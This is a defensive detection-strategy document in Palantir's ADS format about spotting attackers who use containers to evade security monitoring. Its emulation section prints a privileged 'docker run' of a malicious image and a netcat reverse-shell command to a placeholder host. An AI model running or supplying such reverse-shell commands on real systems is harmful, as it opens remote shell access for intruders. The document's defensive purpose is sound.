# Palantir's Alerting & Detection Strategy: Detect Adversarial Attempts to Bypass Security Monitoring Using Containers

## Goal
The primary objective of this technique is to detect adversarial attempts to bypass security monitoring by exploiting containerized environments. Adversaries may leverage containers for their agility, scalability, and ease of deployment to evade detection mechanisms typically designed for more static infrastructures.

## Strategy Abstract
The detection strategy focuses on identifying anomalous behaviors and patterns within container environments that suggest attempts to bypass security monitoring. Key data sources include:

- Container runtime logs
- Network traffic associated with containerized applications
- Host system metrics (CPU, memory usage)
- File integrity monitoring tools

Patterns analyzed for detection include unusual spikes in resource utilization, unexpected network connections from containers, and modifications of sensitive files within the container ecosystem.

## Technical Context
Adversaries exploit container technologies to deploy covert operations or exfiltrate data while minimizing their footprint. This is often achieved by:

- Establishing communication with command-and-control servers via encrypted channels.
- Injecting malicious code into legitimate processes running inside containers.
- Modifying host configurations to disable monitoring tools.

**Adversary Emulation Details:**

Sample commands might include:
```bash
# Creating a container with elevated privileges
docker run --privileged -d my-malicious-image

# Establishing covert communication from within the container
nc -e /bin/sh target.com 1234
```

Test scenarios could involve deploying containers that mimic adversary behaviors such as network scans or unusual data exfiltration patterns.

## Blind Spots and Assumptions
- **Blind Spot:** Legitimate administrative activities that resemble adversarial behavior may not be adequately filtered, leading to potential false positives.
- **Assumption:** Monitoring tools are correctly configured and integrated across the containerized environment. Any misconfiguration can lead to gaps in detection coverage.

## False Positives
Potential benign activities that might trigger alerts include:

- Legitimate updates or patches applied within containers resulting in temporary resource spikes.
- Routine administrative tasks executed from privileged accounts within the container network.
- Authorized data transfers occurring during peak usage times.

## Priority
**Priority: High**

The severity is deemed high due to the sophisticated nature of adversaries exploiting containers, which can lead to significant breaches if undetected. Containers are increasingly used in enterprise environments, making them attractive targets for malicious actors aiming to bypass traditional security measures.

## Validation (Adversary Emulation)
Currently, no specific step-by-step instructions are available to emulate this technique within a test environment. However, organizations should simulate potential attack vectors by conducting red team exercises that focus on container exploitation and monitoring the detection system's response.

## Response
When an alert is triggered:

1. **Immediate Containment:** Isolate affected containers from the network to prevent further spread.
2. **Investigate Logs:** Review relevant logs for any anomalous activities or indicators of compromise (IOCs).
3. **Analyze Traffic Patterns:** Examine network traffic originating from the container for signs of data exfiltration.
4. **Assess Host Impact:** Determine if host systems have been compromised or configurations altered to disable monitoring tools.

## Additional Resources
Additional references and context specific to this detection strategy are currently unavailable. Organizations should refer to their internal security policies, threat intelligence feeds, and community best practices for further guidance on securing containerized environments against adversarial threats.
